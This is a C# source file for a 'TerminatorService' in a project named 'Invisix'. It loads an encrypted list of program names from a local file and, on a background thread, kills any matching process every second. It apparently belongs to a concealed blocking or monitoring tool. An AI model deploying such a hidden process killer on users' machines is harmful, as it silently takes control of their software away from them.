using System;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Invisix
{
    class TerminatorService
    {
        private static string[] programs;
        private const string filename = "t_p";

        private void LoadPrograms()
        {
            FileStream fs = File.Open(filename, FileMode.OpenOrCreate);

            try
            {
                var result = new byte[fs.Length];

                fs.Read(result, 0, result.Length);

                string text = "";

                foreach (char c in result)
                    text += c;

                text = EncryptionService.Decrypt(text);

                programs = text.Split(';');
            }
            finally
            {
                fs.Close();
            }

        }

        public TerminatorService()
        {
            LoadPrograms();
        }

        public void start()
        {
            LoadPrograms();
            Thread tr = new Thread(TerminateLoop);
            tr.IsBackground = true;
            tr.Start();
        }

        private void KillProgramByName(string program)
        {
            Process[] processes = Process.GetProcessesByName(program);
            foreach (Process process in processes)
            {
                process.Kill();
            }

        }

        private void TerminateLoop()
        {
            while (true)
            {
                try
                {
                    foreach (string program in programs)
                        KillProgramByName(program);
                    Thread.Sleep(1000);
                }
                catch (Exception ex)
                {
                    Log.e("failed to terminate", ex);
                }
            }
        }

        public static void add(string program)
        {
            var tmp = new string[programs.Length + 1];
            for (int i = 0; i < programs.Length; i++)
                tmp[i] = programs[i];
            tmp[tmp.Length - 1] = program;
            programs = tmp;


            FileStream fs = File.Open(filename, FileMode.OpenOrCreate);

            try
            {
                string content = "";

                if (fs.Length != 0)
                {
                    var byteArray = new byte[fs.Length];
                    fs.Read(byteArray, 0, byteArray.Length);

                    foreach (char c in byteArray)
                        content += c;
                    content = EncryptionService.Decrypt(content);

                    foreach (string item in content.Split(';'))
                        if (item == program)
                        {
                            fs.Close();
                            return;
                        }

                    content += ";" + program;
                }
                else
                    content = program;
                fs.Close();
                content = EncryptionService.Encrypt(content);
                Log.e("encrypted :" + content);

                byte[] resultByteArray = new byte[content.Length];

                for (int i = 0; i < content.Length; i++)
                    resultByteArray[i] = (byte)content[i];

                FileStream writer = File.OpenWrite(filename);
                writer.Write(resultByteArray, 0, resultByteArray.Length);
                writer.Close();
            }
            catch (Exception ex)
            {
                Log.e("failed to add terminator program", ex);
            }
        }

    }
}
